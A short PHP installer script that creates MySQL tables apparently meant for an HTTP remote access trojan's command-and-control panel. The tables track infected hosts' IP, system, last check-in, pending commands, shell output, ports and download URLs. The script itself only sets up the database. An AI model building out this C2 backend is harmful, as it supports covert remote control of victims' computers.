<?php
require("config.php");
$mysqli = new mysqli($dbaddr,$username,$password,$dbname);
if(mysqli_connect_error())
{
	printf("数据库连接失败：%s\n",mysqli_connect_error());
	exit();
}
$sql="CREATE TABLE IF NOT EXISTS `httprat` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` text NOT NULL,
  `ver` int(5) NOT NULL,
  `IP` text NOT NULL,
  `system` text NOT NULL,
  `lasttime` datetime NOT NULL,
  `cmd` int(5) NOT NULL,
  `shell` text NOT NULL,
  `ports` text NOT NULL,
  `url` text NOT NULL,
  `filename` text NOT NULL,
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1";

$mysqli->query($sql);

$sql="CREATE TABLE IF NOT EXISTS `status` (
  `id` int(10) unsigned NOT NULL,
  `shellLT` datetime NOT NULL,
  `tranLT` datetime NOT NULL
) ENGINE=MyISAM  DEFAULT CHARSET=utf8";

$mysqli->query($sql);

echo "installed!";
?>